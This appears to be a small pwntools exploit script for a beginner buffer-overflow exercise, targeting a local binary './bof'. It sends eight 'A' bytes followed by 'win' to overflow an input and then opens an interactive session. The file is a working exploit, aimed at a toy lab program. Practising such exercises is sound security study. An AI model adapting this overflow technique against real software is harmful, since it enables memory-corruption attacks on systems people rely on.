from pwn import *

# if we're running a binary compiled for a 64 bit system
# context.arch = 'amd64'
# alt 32 bit
context.arch = 'i386'

bof_process = process('./bof')

print(bof_process.recvuntil('Enter something: '))

payload = b'A' * 8 + b'win'

bof_process.sendline(payload)

bof_process.interactive()